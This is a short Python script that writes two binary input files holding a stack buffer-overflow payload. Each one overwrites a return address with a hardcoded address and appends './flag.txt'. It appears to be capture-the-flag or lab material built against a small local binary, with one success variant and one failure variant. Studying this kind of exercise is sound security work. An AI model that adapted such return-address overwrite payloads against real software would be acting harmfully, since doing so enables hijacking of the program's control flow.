import struct


def exploit():
	ex = b""

	ex += b'a'*16
	ex += b'b'*16

	ex += b'c'*16
	ex += b'd'*16
	ex += b'z'*(16+8)
	#4005a1 in s1.c
	ex += struct.pack("<Q",0x00000000004005e2)
	ex += b'\n'

	ex = ex * 8

	ex += b'./flag.txt\x00XXXXXXXXXXX'

	return ex


def exploitfail():
	ex = b""

	ex += b'a'*16
	ex += b'b'*16

	ex += b'c'*16
	ex += b'd'*16
	ex += b'z'*(16+8)
	#4005a1 in s1.c
	ex += struct.pack("<Q",0x00000000004005ed)
	ex += b'\n'

	ex = ex * 8

	ex += b'./flag.txt\x00XXXXXXXXXXX'

	return ex

with open("input_exploit", "wb") as fp:
	fp.write(exploit())

with open("input_exploitfail", "wb") as fp:
	fp.write(exploitfail())

